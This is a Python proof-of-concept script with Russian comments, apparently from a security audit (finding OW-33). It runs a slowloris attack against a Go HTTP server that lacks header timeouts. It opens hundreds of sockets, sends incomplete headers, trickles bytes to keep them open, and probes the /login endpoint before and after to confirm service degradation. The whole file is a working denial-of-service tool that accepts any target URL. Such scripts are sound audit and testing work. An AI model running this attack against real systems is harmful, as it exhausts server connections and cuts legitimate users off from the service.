#!/usr/bin/env python3
"""
03 — медленные заголовки против http.Server без ReadHeaderTimeout (OW-33).

server.go:61-66 поднимает ListenAndServe() с сервером по умолчанию:
нет ReadHeaderTimeout, ReadTimeout, WriteTimeout, IdleTimeout.
Клиент может прислать начало запроса и тянуть заголовки сколько угодно —
соединение висит вечно, goroutine и fd заняты.

Использование:
  python3 03_slowloris.py [BASE_URL] [HOLD_SECONDS] [SOCKETS]
"""
import socket
import sys
import time
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:18081"
HOLD = int(sys.argv[2]) if len(sys.argv) > 2 else 30
N = int(sys.argv[3]) if len(sys.argv) > 3 else 500

host, port = BASE.split("//", 1)[1].split(":")
port = int(port)


def probe() -> tuple[int, float]:
    t = time.time()
    try:
        with urllib.request.urlopen(BASE + "/login", timeout=5) as r:
            return r.status, time.time() - t
    except Exception as e:  # noqa: BLE001
        return 0, time.time() - t


print("== OW-33: до атаки ==")
code, dt = probe()
print("GET /login -> %d за %.2fs" % (code, dt))

socks: list[socket.socket] = []
fail = 0
for i in range(N):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((host, port))
        # начало запроса без завершающего \r\n\r\n — сервер ждёт конца заголовков
        s.sendall(
            ("GET /login HTTP/1.1\r\nHost: %s\r\n" % host).encode()
            + ("X-Slow-%d: a" % i).encode()
        )
        socks.append(s)
    except OSError:
        fail += 1
        break

print("\n== OW-33: держим %d соединений %d секунд (байты шлём раз в 3с) ==" % (len(socks), HOLD))
alive = len(socks)
end = time.time() + HOLD
while time.time() < end:
    dead = 0
    for s in socks:
        try:
            s.sendall(b" ")          # продлеваем, сервер обязан ждать
        except OSError:
            dead += 1
    if dead:
        alive = len(socks) - dead
        print("  сервер закрыл %d соединений из %d" % (dead, len(socks)))
        break
    time.sleep(3)

print("соединений удерживается: %d (упало по сети: %d)" % (alive, fail))
print("если сервер закрыл 0 — ReadHeaderTimeout отсутствует и fd висят вечно")
print("┌─ АРТЕФАКТ · OW-33")
print("│ соединения удерживаются: %d; закрыты сервером: %d; probe до атаки: %s" %
      (alive, len(socks) - alive, code))
print("└─")
if alive and code == 200:
    print("\033[32m[+] сервер держит незавершённые заголовки: ReadHeaderTimeout отсутствует\033[0m")
else:
    print("\033[31m[-] соединения не удерживались — закрытие по таймауту вдруг работает\033[0m")

print("\n== OW-33: после атаки ==")
for _ in range(3):
    code, dt = probe()
    print("GET /login -> %d за %.2fs" % (code, dt))

for s in socks:
    try:
        s.close()
    except OSError:
        pass
